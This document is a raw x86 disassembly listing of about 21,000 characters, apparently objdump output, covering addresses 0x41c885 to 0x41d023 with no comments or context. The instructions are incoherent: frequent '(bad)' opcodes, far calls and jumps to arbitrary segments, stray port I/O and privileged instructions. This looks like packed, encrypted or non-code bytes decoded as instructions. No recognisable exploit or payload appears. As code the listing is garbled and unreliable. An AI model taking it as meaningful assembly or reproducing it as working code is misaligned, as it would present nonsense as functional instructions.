  41c885:	std    
  41c886:	popa   
  41c887:	shr    DWORD PTR [eax+0xd],1
  41c88a:	mov    cl,0x36
  41c88c:	mov    ds:0x8e0d9bcb,eax
  41c891:	push   es
  41c892:	sub    BYTE PTR [ecx],dl
  41c894:	out    0x3f,al
  41c896:	add    ebp,DWORD PTR ds:0x91a159d7
  41c89c:	dec    ebp
  41c89d:	(bad)  
  41c89e:	out    dx,eax
  41c89f:	push   es
  41c8a0:	mov    ds:0x3b2d9d01,eax
  41c8a5:	sbb    al,0xe4
  41c8a7:	push   esi
  41c8a8:	push   ebx
  41c8a9:	lea    esp,[edi]
  41c8ab:	xor    al,0x45
  41c8ad:	jecxz  0x41c8ef
  41c8af:	jmp    0xb964:0xe1b36eef
  41c8b6:	jg     0x41c91a
  41c8b8:	xor    eax,0x6689fc69
  41c8bd:	jb     0x41c85e
  41c8bf:	stc    
  41c8c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c8c1:	jge    0x41c8d2
  41c8c3:	pop    ebx
  41c8c4:	loope  0x41c8cb
  41c8c6:	pcmpgtb mm7,QWORD PTR [ebx+0x66]
  41c8ca:	mov    dl,bh
  41c8cc:	sbb    DWORD PTR [ebp+edx*8+0x2a34d202],edx
  41c8d3:	add    dl,bh
  41c8d5:	fadd   st,st(4)
  41c8d7:	leave  
  41c8d8:	sub    dh,bl
  41c8da:	mov    eax,ds:0xafa97db1
  41c8df:	js     0x41c8ad
  41c8e1:	repnz aaa 
  41c8e3:	fs dec eax
  41c8e5:	dec    edi
  41c8e6:	call   0xc4a8:0x4841ba4a
  41c8ed:	mov    esi,0x9098585e
  41c8f2:	lds    esi,FWORD PTR fs:[esi+0x1c0de939]
  41c8f9:	jg     0x41c8d6
  41c8fb:	pop    ecx
  41c8fc:	out    dx,eax
  41c8fd:	jne    0x41c922
  41c8ff:	inc    edi
  41c900:	adc    DWORD PTR [ecx-0x35e7f85f],esi
  41c906:	push   ebp
  41c907:	loope  0x41c91b
  41c909:	mov    ch,0x37
  41c90b:	xor    al,0x86
  41c90d:	sub    BYTE PTR [edi+0x73f78518],0xd6
  41c914:	lock sub edi,ebx
  41c917:	jl     0x41c8be
  41c919:	add    edi,DWORD PTR [edx+0x4af0c562]
  41c91f:	xchg   ebp,eax
  41c920:	sahf   
  41c921:	xchg   BYTE PTR [esi+0xa81e903],dl
  41c927:	cmp    eax,0xaa7f470a
  41c92c:	push   ebx
  41c92d:	push   esi
  41c92e:	xchg   ecx,eax
  41c92f:	mov    esp,0xefee9f83
  41c934:	mov    dl,0x40
  41c936:	aam    0x56
  41c938:	jmp    0x41c97f
  41c93a:	call   0xd646fb63
  41c93f:	call   0x3d75:0x3cc14c84
  41c946:	sbb    BYTE PTR [eax],dh
  41c948:	test   al,0xbe
  41c94a:	push   edx
  41c94b:	cmc    
  41c94c:	cmp    DWORD PTR [eax+ebx*8+0x2a],0xffffff89
  41c951:	cmp    ah,BYTE PTR [ebx+0x1f]
  41c954:	add    BYTE PTR [ecx+edi*1+0x7aeed612],0xde
  41c95c:	fmul   st,st(4)
  41c95e:	pop    esp
  41c95f:	cmp    ebx,DWORD PTR [ecx]
  41c961:	jmp    FWORD PTR [edi-0x53]
  41c964:	scas   al,BYTE PTR es:[edi]
  41c965:	mov    bl,0x78
  41c967:	rcr    DWORD PTR [edx+edx*4-0x54d558a9],0x42
  41c96f:	mov    eax,0xb400b1d7
  41c974:	daa    
  41c975:	loope  0x41c9f5
  41c977:	pop    esp
  41c978:	pop    es
  41c979:	rcl    BYTE PTR [edx],0x12
  41c97c:	ins    BYTE PTR es:[edi],dx
  41c97d:	jge    0x41c95d
  41c97f:	pop    edi
  41c980:	mov    eax,esp
  41c982:	mov    ecx,0x110674e0
  41c987:	(bad)  
  41c988:	dec    edx
  41c989:	in     al,dx
  41c98a:	shl    BYTE PTR [ecx+edi*8],1
  41c98d:	jo     0x41c963
  41c98f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c990:	out    0x61,eax
  41c992:	arpl   WORD PTR [ecx],si
  41c994:	in     eax,dx
  41c995:	push   eax
  41c996:	dec    ecx
  41c997:	sahf   
  41c998:	push   ss
  41c999:	call   0x70f0:0xbf769ab8
  41c9a0:	sbb    bl,BYTE PTR [edi+0x33cc8bd1]
  41c9a6:	ss out dx,eax
  41c9a8:	pop    eax
  41c9a9:	sbb    eax,0xdd0651d2
  41c9ae:	cmp    eax,0xcaceec9f
  41c9b3:	mov    ebx,0x4e3f0546
  41c9b8:	clc    
  41c9b9:	or     ebp,ebp
  41c9bb:	fucompp 
  41c9bd:	mov    bl,0x76
  41c9bf:	icebp  
  41c9c0:	pop    eax
  41c9c1:	mov    ch,0x9
  41c9c3:	inc    ecx
  41c9c4:	adc    BYTE PTR [edi],cl
  41c9c6:	jae    0x41ca43
  41c9c8:	ret    0x5fc0
  41c9cb:	leave  
  41c9cc:	pop    eax
  41c9cd:	cli    
  41c9ce:	hlt    
  41c9cf:	lods   eax,DWORD PTR ds:[esi]
  41c9d0:	ficom  DWORD PTR [eax]
  41c9d2:	das    
  41c9d3:	mov    ah,0x8e
  41c9d5:	pop    esi
  41c9d6:	pushf  
  41c9d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c9d8:	imul   edi,edx,0xffffffc6
  41c9db:	xor    al,bl
  41c9dd:	inc    eax
  41c9de:	setbe  dl
  41c9e1:	inc    esp
  41c9e2:	add    cl,BYTE PTR [ebp+eax*2-0x7f]
  41c9e6:	stos   DWORD PTR es:[edi],eax
  41c9e7:	fisub  DWORD PTR [eax]
  41c9e9:	daa    
  41c9ea:	inc    esp
  41c9eb:	dec    ebp
  41c9ec:	pushf  
  41c9ed:	lea    esi,[eax-0x79]
  41c9f0:	call   0xc2c3:0x69c93825
  41c9f7:	cs push eax
  41c9f9:	jle    0x41c9c5
  41c9fb:	inc    ecx
  41c9fc:	repnz xchg esi,eax
  41c9fe:	mov    ebx,0x86708756
  41ca03:	sub    esi,esp
  41ca05:	cmp    al,0xf0
  41ca07:	js     0x41c9a5
  41ca09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ca0a:	retf   
  41ca0b:	cmp    bl,dl
  41ca0d:	dec    ecx
  41ca0e:	mov    DWORD PTR [esi-0x79],ebx
  41ca11:	scas   al,BYTE PTR es:[edi]
  41ca12:	imul   ebp,DWORD PTR [ebp-0x6d],0xfffffffb
  41ca16:	mov    ah,0xbf
  41ca18:	push   eax
  41ca19:	fdivr  DWORD PTR [esi-0x59]
  41ca1c:	in     eax,0xf2
  41ca1e:	(bad)  
  41ca1f:	call   0x30a8:0x87256115
  41ca26:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ca27:	js     0x41ca37
  41ca29:	inc    edx
  41ca2a:	repnz xor al,0x1d
  41ca2d:	mov    edx,0xc905c257
  41ca32:	mov    eax,ds:0x72d9862f
  41ca37:	fdivr  st(1),st
  41ca39:	fwait
  41ca3a:	cmp    al,bh
  41ca3c:	inc    ebp
  41ca3d:	sbb    al,0x94
  41ca3f:	mov    ch,0x46
  41ca41:	xlat   BYTE PTR ds:[ebx]
  41ca42:	pop    edx
  41ca43:	ds mov ch,0xf0
  41ca46:	mov    esp,0xf3aa4d4a
  41ca4b:	(bad)  
  41ca4c:	imul   eax,DWORD PTR [esp+ecx*1-0x56]
  41ca51:	fwait
  41ca52:	int    0xbf
  41ca54:	inc    esi
  41ca55:	adc    esp,DWORD PTR ds:0x71529838
  41ca5b:	iret   
  41ca5c:	loope  0x41ca87
  41ca5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ca5f:	cld    
  41ca60:	lds    sp,DWORD PTR [edx-0x498e7ac6]
  41ca67:	scas   eax,DWORD PTR es:[edi]
  41ca68:	(bad)  
  41ca69:	int    0x9a
  41ca6b:	ins    BYTE PTR es:[edi],dx
  41ca6c:	nop
  41ca6d:	icebp  
  41ca6e:	pop    es
  41ca6f:	nop
  41ca70:	dec    edi
  41ca71:	lahf   
  41ca72:	push   esp
  41ca73:	pop    esp
  41ca74:	and    al,0x33
  41ca76:	xor    DWORD PTR [edx+edi*8-0x26040c82],esp
  41ca7d:	adc    edi,DWORD PTR [ebp+0xb]
  41ca80:	add    bh,BYTE PTR [edi-0x1c]
  41ca83:	adc    DWORD PTR [ebx+0x78],0xb25ba006
  41ca8a:	mov    esp,0xe3d4d8d7
  41ca8f:	popa   
  41ca90:	nop
  41ca91:	lock xor eax,0xea373df4
  41ca97:	rcr    BYTE PTR [edi+0x67ed0da3],cl
  41ca9d:	xor    eax,0xe6d5e4b4
  41caa2:	push   edi
  41caa3:	dec    eax
  41caa4:	pop    ebp
  41caa5:	cmp    dl,cl
  41caa7:	idiv   BYTE PTR [ebx]
  41caa9:	inc    esi
  41caaa:	pop    edi
  41caab:	stos   BYTE PTR es:[edi],al
  41caac:	push   ecx
  41caad:	cmp    DWORD PTR [edi+0x27d47a53],eax
  41cab3:	ret    0xe38d
  41cab6:	jg     0x41cb2e
  41cab8:	jmp    0xb9eae5d5
  41cabd:	or     BYTE PTR [ecx-0x469be7d0],ah
  41cac3:	pop    esi
  41cac4:	xchg   DWORD PTR [ebx-0x418e5958],edx
  41caca:	inc    ecx
  41cacb:	sbb    BYTE PTR [ebp+0x1b96f812],bh
  41cad1:	pop    ebp
  41cad2:	and    al,0x5e
  41cad4:	ja     0x41caa9
  41cad6:	es (bad) 
  41cad8:	xor    BYTE PTR [esi-0x3633c041],ch
  41cade:	sbb    DWORD PTR [esi+0x2b],ebx
  41cae1:	ins    DWORD PTR es:[edi],dx
  41cae2:	div    DWORD PTR [esp+edx*8+0x42a009cd]
  41cae9:	adc    BYTE PTR [ebx-0x617fe17a],bh
  41caef:	jb     0x41cac7
  41caf1:	inc    esi
  41caf2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41caf3:	(bad)  
  41caf4:	shld   DWORD PTR [eax+0x71990c80],ecx,cl
  41cafb:	xor    al,BYTE PTR [ebx+esi*4]
  41cafe:	fwait
  41caff:	adc    DWORD PTR [eax-0x29],esi
  41cb02:	nop
  41cb03:	xor    DWORD PTR [ecx-0x8f028af],eax
  41cb09:	add    eax,DWORD PTR [ecx+eiz*2-0x2fcf71f0]
  41cb10:	arpl   WORD PTR [ecx+eiz*2-0x53],cx
  41cb14:	sbb    edi,DWORD PTR [edx+0x8]
  41cb17:	outs   dx,BYTE PTR ds:[esi]
  41cb18:	sub    ah,BYTE PTR [ebx+0xc]
  41cb1b:	ds sub cl,dh
  41cb1e:	push   ebp
  41cb1f:	sbb    eax,0x493f1688
  41cb24:	(bad)  
  41cb26:	sub    ch,dl
  41cb28:	jo     0x41cb51
  41cb2a:	xchg   BYTE PTR [edx+0x79db9de2],dh
  41cb30:	fucomi st,st(3)
  41cb32:	into   
  41cb33:	ret    
  41cb34:	xor    bh,BYTE PTR [ebp+0x7854d8d9]
  41cb3a:	and    al,0x6f
  41cb3c:	push   ds
  41cb3d:	call   0x773289cf
  41cb42:	ret    
  41cb43:	das    
  41cb44:	sbb    al,0x74
  41cb46:	pop    es
  41cb47:	stos   BYTE PTR es:[edi],al
  41cb48:	fs xchg esi,eax
  41cb4a:	jle    0x41cafc
  41cb4c:	sub    al,0x7f
  41cb4e:	fnstsw WORD PTR [ebp+0x7af14ca8]
  41cb54:	xchg   esp,eax
  41cb55:	or     ch,BYTE PTR [eax]
  41cb57:	mov    ds:0x8fd4ce20,eax
  41cb5c:	push   ecx
  41cb5d:	and    BYTE PTR [edx+0x374ca4a9],0xfd
  41cb64:	rol    BYTE PTR [ebx],1
  41cb66:	addr16 out dx,al
  41cb68:	xor    BYTE PTR [esi-0x6a16d006],ch
  41cb6e:	mov    ebx,0x9dfdc712
  41cb73:	rol    DWORD PTR ds:0x67b065cc,0x79
  41cb7a:	daa    
  41cb7b:	mov    dl,0xdb
  41cb7d:	rol    BYTE PTR [ebp-0x7b],0xf2
  41cb81:	pushf  
  41cb82:	add    BYTE PTR [edx+0x22],ch
  41cb85:	ror    ebx,0xe8
  41cb88:	mov    ch,0x3d
  41cb8a:	push   esp
  41cb8b:	add    ecx,esp
  41cb8d:	das    
  41cb8e:	pop    eax
  41cb8f:	(bad)  
  41cb90:	mov    eax,ds:0x20d955ce
  41cb95:	jne    0x41cba3
  41cb97:	push   esi
  41cb98:	pushf  
  41cb99:	pop    ecx
  41cb9a:	test   al,0x1a
  41cb9c:	xchg   edx,eax
  41cb9d:	shr    BYTE PTR [edx+0x7e4b17d1],1
  41cba3:	inc    ebp
  41cba4:	rcr    BYTE PTR [eax-0x1f],1
  41cba7:	(bad)  
  41cba8:	push   ebp
  41cba9:	push   es
  41cbaa:	xor    BYTE PTR [esi],ch
  41cbac:	add    BYTE PTR [ebx],0xfc
  41cbaf:	fsub   st(0),st
  41cbb1:	xchg   esi,eax
  41cbb2:	dec    ebx
  41cbb3:	(bad)  
  41cbb4:	mov    ah,0x2c
  41cbb6:	mov    esp,0x34a46f2e
  41cbbb:	rcl    BYTE PTR [edx-0x2845e212],1
  41cbc1:	mov    ah,0x7b
  41cbc3:	push   edx
  41cbc4:	out    dx,eax
  41cbc5:	and    DWORD PTR [ecx-0x51],edx
  41cbc8:	mov    eax,0xf87c29bc
  41cbcd:	push   cs
  41cbce:	pop    edx
  41cbcf:	or     bl,BYTE PTR [edx-0x1d]
  41cbd2:	xchg   edx,eax
  41cbd3:	inc    ebp
  41cbd4:	jb     0x41cc2c
  41cbd6:	cmp    esp,DWORD PTR ds:0xc334db0f
  41cbdc:	adc    eax,0xeae7db02
  41cbe1:	push   esi
  41cbe2:	inc    esi
  41cbe3:	push   0xffffffff
  41cbe5:	xchg   ebp,eax
  41cbe6:	das    
  41cbe7:	jne    0x41cb6d
  41cbe9:	cmp    cl,cl
  41cbeb:	nop
  41cbec:	repz cs xchg edx,eax
  41cbef:	dec    eax
  41cbf0:	shl    DWORD PTR [ecx+ebx*8],1
  41cbf3:	adc    DWORD PTR fs:[esp+eiz*2],edi
  41cbf7:	call   0x7bce:0x95d3c397
  41cbfe:	and    eax,0xa9fdf6fa
  41cc03:	push   esp
  41cc04:	das    
  41cc05:	and    eax,0xd31b8b04
  41cc0a:	xchg   edi,eax
  41cc0b:	(bad)  [edi+edx*1+0x49]
  41cc0f:	xor    eax,0xb863ea49
  41cc14:	push   edx
  41cc15:	loopne 0x41cc6f
  41cc17:	cmp    bh,BYTE PTR [edx]
  41cc19:	xchg   esp,eax
  41cc1a:	jne    0x41cc84
  41cc1c:	or     bl,BYTE PTR [esi-0x5]
  41cc1f:	jl     0x41cbcc
  41cc21:	mov    eax,ds:0xe9e776cd
  41cc26:	pop    ecx
  41cc27:	push   0x2a
  41cc29:	icebp  
  41cc2a:	aam    0xfe
  41cc2c:	pop    DWORD PTR [eax]
  41cc2e:	scas   al,BYTE PTR es:[edi]
  41cc2f:	push   ds
  41cc30:	pop    ds
  41cc31:	pusha  
  41cc32:	add    dh,BYTE PTR ds:0x2bb5949c
  41cc38:	pop    ebp
  41cc39:	into   
  41cc3a:	and    ah,bh
  41cc3c:	stos   BYTE PTR es:[edi],al
  41cc3d:	jp     0x41cbed
  41cc3f:	or     eax,0xa9097fe0
  41cc44:	pushw  cs
  41cc46:	xor    eax,0x54a1651
  41cc4b:	add    eax,0x39259bce
  41cc50:	jle    0x41cbda
  41cc52:	pop    esp
  41cc53:	pop    esp
  41cc54:	pusha  
  41cc55:	mov    ebp,0xc8fcda52
  41cc5a:	test   al,0xb8
  41cc5c:	punpckhbw mm5,QWORD PTR [esi+0x4a]
  41cc60:	popf   
  41cc61:	cs mov edi,0xf144fc6b
  41cc67:	inc    ebx
  41cc68:	hlt    
  41cc69:	fnsave [ebx]
  41cc6b:	in     eax,dx
  41cc6c:	ins    BYTE PTR es:[edi],dx
  41cc6d:	add    eax,0x251b5dbb
  41cc72:	out    dx,al
  41cc73:	shr    ebp,0x41
  41cc76:	jbe    0x41cc87
  41cc78:	cs xchg ecx,eax
  41cc7a:	ja     0x41cc59
  41cc7c:	jmp    0x2de3:0x6b59ffe2
  41cc83:	mov    bl,0xe9
  41cc85:	addr16 or al,0x40
  41cc88:	test   al,0xc6
  41cc8a:	mov    edx,ebx
  41cc8c:	sub    al,0xf0
  41cc8e:	pop    ebx
  41cc8f:	retf   
  41cc90:	mov    ch,0x22
  41cc92:	dec    edi
  41cc93:	mov    ds:0x7564c405,eax
  41cc98:	xor    ch,dh
  41cc9a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cc9b:	call   0x6af7:0x841fe3ed
  41cca2:	jle    0x41cc38
  41cca4:	jl     0x41cd0b
  41cca6:	mov    ds:0x8439af4,al
  41ccab:	dec    edi
  41ccac:	xchg   esp,eax
  41ccad:	jecxz  0x41cd19
  41ccaf:	pushf  
  41ccb0:	or     eax,0xcbcbd73b
  41ccb5:	or     al,0xa6
  41ccb7:	push   ss
  41ccb8:	into   
  41ccb9:	pop    esp
  41ccba:	in     eax,0x89
  41ccbc:	das    
  41ccbd:	mov    ds:0x76c758db,al
  41ccc2:	dec    ebp
  41ccc3:	sub    al,0x3f
  41ccc5:	call   0xfea:0x51c9cccb
  41cccc:	mov    ss,WORD PTR [eax+0x75b4a092]
  41ccd2:	sbb    eax,0xd32422a6
  41ccd7:	push   0x7e
  41ccd9:	js     0x41cc71
  41ccdb:	test   al,0xae
  41ccdd:	pop    ebx
  41ccde:	add    dl,BYTE PTR [ebp+0x7b]
  41cce1:	add    eax,0x8b4af2b6
  41cce6:	mov    esp,es
  41cce8:	pop    edi
  41cce9:	(bad)  [edi]
  41cceb:	call   0x9c1e:0x30bd84cb
  41ccf2:	retf   0x597
  41ccf5:	cmp    DWORD PTR [ecx+0x4cc26f0e],edx
  41ccfb:	je     0x41ccf2
  41ccfd:	inc    edx
  41ccfe:	inc    DWORD PTR [esi+0x77d62682]
  41cd04:	inc    ecx
  41cd05:	mov    al,0x77
  41cd07:	push   ds
  41cd08:	mov    al,0x9
  41cd0a:	gs fcom st(6)
  41cd0d:	mov    esp,0x863d8785
  41cd12:	cld    
  41cd13:	js     0x41cd8f
  41cd15:	nop
  41cd16:	inc    edx
  41cd17:	jg     0x41cd87
  41cd19:	aad    0x2
  41cd1b:	xor    DWORD PTR [eax],0xd2ee57ae
  41cd21:	pop    ecx
  41cd22:	xor    dh,BYTE PTR [ebx+ebx*1-0x2e]
  41cd26:	cmp    cl,BYTE PTR [esi+ebx*4-0x6a11f031]
  41cd2d:	loopne 0x41cd1a
  41cd2f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cd30:	cdq    
  41cd31:	sub    DWORD PTR [ecx+0x417d4006],ecx
  41cd37:	dec    edi
  41cd38:	(bad)  
  41cd39:	mov    ch,0xf9
  41cd3b:	mov    BYTE PTR [eax],ah
  41cd3d:	test   al,0x17
  41cd3f:	inc    ebx
  41cd40:	and    eax,0x967f47d5
  41cd45:	fldcw  WORD PTR [ebp+0x78b77106]
  41cd4b:	mov    dh,BYTE PTR [esi+0x2b6241ca]
  41cd51:	test   esp,0x105a3794
  41cd57:	jb     0x41cdb4
  41cd59:	mov    al,ds:0xf2e7f9cb
  41cd5e:	jl     0x41cd54
  41cd60:	lds    ecx,FWORD PTR [ebx*1-0x86c0153]
  41cd67:	fs (bad) 
  41cd69:	pop    edx
  41cd6a:	rcl    BYTE PTR [ebx],0x2
  41cd6d:	fisttp WORD PTR [eax]
  41cd6f:	int    0x7f
  41cd71:	jl     0x41cd37
  41cd73:	mov    ebx,0xa2e5decb
  41cd78:	inc    edx
  41cd79:	pop    edi
  41cd7a:	add    ecx,edi
  41cd7c:	sbb    eax,0xa1239e0
  41cd81:	push   ecx
  41cd82:	mov    ch,0xc7
  41cd84:	pop    esi
  41cd85:	fsub   st,st(3)
  41cd87:	repz fucomp st(3)
  41cd8a:	(bad)  
  41cd8b:	into   
  41cd8c:	push   ebx
  41cd8d:	test   eax,0xb1a63931
  41cd92:	mov    edx,eax
  41cd94:	adc    eax,0xea12aad2
  41cd99:	mov    esp,0x2d20f113
  41cd9e:	in     al,0x8c
  41cda0:	outs   dx,BYTE PTR ds:[esi]
  41cda1:	dec    esp
  41cda2:	test   al,0xec
  41cda4:	ret    0x1936
  41cda7:	inc    eax
  41cda8:	addr16 dec edx
  41cdaa:	dec    ebx
  41cdab:	in     al,dx
  41cdac:	and    DWORD PTR [ebx],0xe354f6b4
  41cdb2:	push   esi
  41cdb3:	inc    ebp
  41cdb4:	jg     0x41cd3c
  41cdb6:	mov    bh,0x43
  41cdb8:	sub    al,0x91
  41cdba:	cmp    eax,DWORD PTR [ebp+ecx*1+0x19]
  41cdbe:	int    0xae
  41cdc0:	test   al,0xfc
  41cdc2:	cmp    eax,0x23f934d6
  41cdc7:	mov    eax,ds:0xac1e7eb7
  41cdcc:	sbb    bl,BYTE PTR [ecx-0x33]
  41cdcf:	fist   WORD PTR [ebp-0x780cc6ec]
  41cdd5:	jno    0x41cd7d
  41cdd7:	lods   eax,DWORD PTR ds:[esi]
  41cdd8:	cli    
  41cdd9:	enter  0x635b,0xc2
  41cddd:	lds    ecx,FWORD PTR [edi+0x6e]
  41cde0:	push   es
  41cde1:	retf   0x71fe
  41cde4:	cld    
  41cde5:	int3   
  41cde6:	loope  0x41cd8b
  41cde8:	mov    edx,0xb2520930
  41cded:	in     al,0x7
  41cdef:	dec    eax
  41cdf0:	cld    
  41cdf1:	inc    edx
  41cdf2:	jmp    0xec07:0xec6fa77e
  41cdf9:	loope  0x41ce01
  41cdfb:	cmp    al,0x76
  41cdfd:	(bad)  [ecx+ecx*4+0x669e7007]
  41ce04:	mul    BYTE PTR [esi+ecx*8]
  41ce07:	cmp    eax,0x4e1785a2
  41ce0c:	cmp    dl,BYTE PTR [ebx+0x71]
  41ce0f:	repnz cmp dl,cl
  41ce12:	push   ebp
  41ce13:	push   edi
  41ce14:	sub    DWORD PTR [ecx+ecx*4+0x689f7ce],edi
  41ce1b:	inc    edi
  41ce1c:	mov    cl,0x8b
  41ce1e:	inc    edi
  41ce1f:	xchg   esp,eax
  41ce20:	cmp    al,BYTE PTR [ebx+0x33]
  41ce23:	mov    al,dh
  41ce25:	add    al,0xf8
  41ce27:	out    0x74,al
  41ce29:	ror    DWORD PTR [eax-0x1953da9d],cl
  41ce2f:	out    0x6d,al
  41ce31:	repz sti 
  41ce33:	mov    ebp,0x8296c8c
  41ce38:	mov    edi,0x89b55172
  41ce3d:	shl    DWORD PTR [ebp*4-0x65adc5c6],1
  41ce44:	not    dl
  41ce46:	adc    esi,eax
  41ce48:	mov    edi,0xdbcdbb9b
  41ce4d:	rcr    BYTE PTR [esi-0x160fe43b],cl
  41ce53:	mov    al,ds:0xea531a13
  41ce58:	jmp    FWORD PTR [eax+0x4]
  41ce5b:	inc    ebx
  41ce5c:	pop    edi
  41ce5d:	sbb    bh,BYTE PTR [edx]
  41ce5f:	hlt    
  41ce60:	pushf  
  41ce61:	mov    edi,0xeaaf7c64
  41ce66:	push   ebx
  41ce67:	add    BYTE PTR [ebp-0x31946364],0xfc
  41ce6e:	and    ebx,eax
  41ce70:	mov    edi,0xc43460af
  41ce75:	(bad)  
  41ce77:	dec    ebx
  41ce78:	rcr    DWORD PTR [esi+eiz*1-0x1b],1
  41ce7c:	div    BYTE PTR [eax+edx*4]
  41ce7f:	or     DWORD PTR ds:0x17e200c8,esi
  41ce85:	mov    ch,0xe0
  41ce87:	cs mov ebp,esi
  41ce8a:	fild   QWORD PTR [esi+0x41]
  41ce8d:	imul   eax,esi,0xffffffed
  41ce90:	ret    
  41ce91:	mov    ds:0xbcf04846,eax
  41ce96:	or     eax,0xedde731c
  41ce9b:	pop    ds
  41ce9c:	arpl   WORD PTR [edx],si
  41ce9e:	and    eax,0x798ff802
  41cea3:	dec    edi
  41cea4:	fwait
  41cea5:	ja     0x41cf05
  41cea7:	ss call 0x7632:0x8d1d4689
  41ceaf:	sub    eax,0x38efc8a3
  41ceb4:	sbb    ah,BYTE PTR [esi-0x660365bb]
  41ceba:	mov    dl,0x6b
  41cebc:	push   0xd0cd43f2
  41cec1:	cmp    BYTE PTR [ebp+0x4a26b224],cl
  41cec7:	mov    cx,0x8225
  41cecb:	xor    eax,0x8009f2eb
  41ced0:	push   esp
  41ced1:	push   ss
  41ced2:	mov    ebp,0xd81d2e85
  41ced7:	stos   BYTE PTR es:[edi],al
  41ced8:	mov    edx,0xe417205e
  41cedd:	sub    eax,0x27dd528f
  41cee2:	je     0x41cf20
  41cee4:	shl    DWORD PTR [edx+0x17],0x38
  41cee8:	jnp    0x41cf46
  41ceea:	arpl   WORD PTR [esi-0x6945bf24],bx
  41cef0:	(bad)
  41cef3:	cdq    
  41cef4:	stos   BYTE PTR es:[edi],al
  41cef5:	mov    bl,0xf0
  41cef7:	mov    ecx,0xba8db890
  41cefc:	(bad)  [ebx-0x33]
  41ceff:	dec    eax
  41cf00:	sub    al,0xd2
  41cf02:	xchg   esp,eax
  41cf03:	ins    BYTE PTR es:[edi],dx
  41cf04:	dec    esi
  41cf05:	lds    esp,FWORD PTR [ecx+0xd36f40]
  41cf0b:	(bad)  
  41cf0c:	bnd jg 0x41cf68
  41cf0f:	push   cs
  41cf10:	jno    0x41cf5f
  41cf12:	out    dx,eax
  41cf13:	adc    eax,0xb4b32b36
  41cf18:	imul   edx,DWORD PTR [esi],0x2
  41cf1b:	adc    al,0x69
  41cf1d:	cmc    
  41cf1e:	jecxz  0x41ced1
  41cf20:	and    eax,0x46100b0d
  41cf25:	or     eax,0x2b24e61a
  41cf2a:	and    eax,0x62929353
  41cf2f:	dec    edx
  41cf30:	xchg   ebp,eax
  41cf31:	jne    0x41cf21
  41cf33:	xchg   edi,eax
  41cf34:	(bad)  
  41cf35:	lds    eax,FWORD PTR [eax]
  41cf37:	push   edi
  41cf38:	mov    ds:0xc008d56c,al
  41cf3d:	push   esp
  41cf3e:	mov    ah,0x92
  41cf40:	(bad)  
  41cf41:	hlt    
  41cf42:	in     al,dx
  41cf43:	mov    WORD PTR [edx-0x6b139af],ds
  41cf49:	add    BYTE PTR [edx],ah
  41cf4b:	mov    DWORD PTR [ecx],edx
  41cf4d:	push   0xffffffef
  41cf4f:	jnp    0x41cf8c
  41cf51:	lea    ebx,[esi+esi*4-0x3e]
  41cf55:	adc    ecx,esi
  41cf57:	sbb    bl,dh
  41cf59:	lods   eax,DWORD PTR ds:[esi]
  41cf5a:	or     ebx,DWORD PTR [edi]
  41cf5c:	add    ebx,DWORD PTR [edx+0x2b926adc]
  41cf62:	cmp    BYTE PTR [eax-0x4f4f55e8],bh
  41cf68:	ret    0x6dc2
  41cf6b:	daa    
  41cf6c:	mov    BYTE PTR [esi],dh
  41cf6e:	jge    0x41cf63
  41cf70:	daa    
  41cf71:	dec    edx
  41cf72:	stc    
  41cf73:	adc    al,0x15
  41cf75:	lea    ecx,[esp+esi*8]
  41cf78:	clc    
  41cf79:	pop    edx
  41cf7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cf7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cf7c:	mov    esp,0xc8ce42fc
  41cf81:	xor    DWORD PTR [edi-0x7a],eax
  41cf84:	hlt    
  41cf85:	inc    ebp
  41cf86:	arpl   WORD PTR [esi-0x387ca35b],dx
  41cf8c:	lahf   
  41cf8d:	mov    ebp,0xab59527b
  41cf92:	xor    DWORD PTR [ecx+ebx*2+0x54dd8de5],eax
  41cf99:	dec    edi
  41cf9a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cf9b:	adc    bl,0x28
  41cf9e:	stos   BYTE PTR es:[edi],al
  41cf9f:	lock inc edi
  41cfa1:	xchg   DWORD PTR [ecx+0xa317f41],edx
  41cfa7:	sub    al,0xd0
  41cfa9:	dec    ecx
  41cfaa:	mov    ?,WORD PTR [eax]
  41cfac:	ror    BYTE PTR [ebx],cl
  41cfae:	or     al,dl
  41cfb0:	mov    ebp,0x88111ef2
  41cfb5:	mov    ah,BYTE PTR [ebp-0x2]
  41cfb8:	mov    dl,0x3a
  41cfba:	mov    ds:0x9f2ab217,al
  41cfbf:	shr    BYTE PTR [esi-0x65],cl
  41cfc2:	pop    eax
  41cfc3:	mov    dl,BYTE PTR [ebx+0x6a58898]
  41cfc9:	sti    
  41cfca:	mov    dh,BYTE PTR [ebx+0x5a]
  41cfcd:	and    eax,0x3836c07e
  41cfd2:	ja     0x41cf54
  41cfd4:	xor    esi,DWORD PTR [esi-0x6d]
  41cfd7:	not    BYTE PTR [eax+edx*4-0x326ae06d]
  41cfde:	call   0xb203cb6a
  41cfe3:	cmp    dh,BYTE PTR [ecx-0x4c]
  41cfe6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cfe7:	or     esi,DWORD PTR [esp+ebx*1+0x2c]
  41cfeb:	and    edx,DWORD PTR [ebp+0x12]
  41cfee:	or     ebp,DWORD PTR [ebx]
  41cff0:	mov    esp,0xaf5dd9ce
  41cff5:	pop    ecx
  41cff6:	jl     0x41cfbf
  41cff8:	sbb    eax,0x5ba4c335
  41cffd:	pop    ebx
  41cffe:	(bad)  
  41cfff:	xlat   BYTE PTR ds:[ebx]
  41d000:	adc    BYTE PTR [edx+0x43],0xe2
  41d004:	jmp    0xf472:0xc4dd40b5
  41d00b:	adc    eax,0xb6904983
  41d010:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d011:	xor    eax,0x31772882
  41d016:	bound  ebp,QWORD PTR [ecx+0x2f]
  41d019:	(bad)  
  41d01a:	and    cl,BYTE PTR [eax+eax*2-0x384cec39]
  41d021:	int    0xff
  41d023:	xor    eax,0x41cbbedc
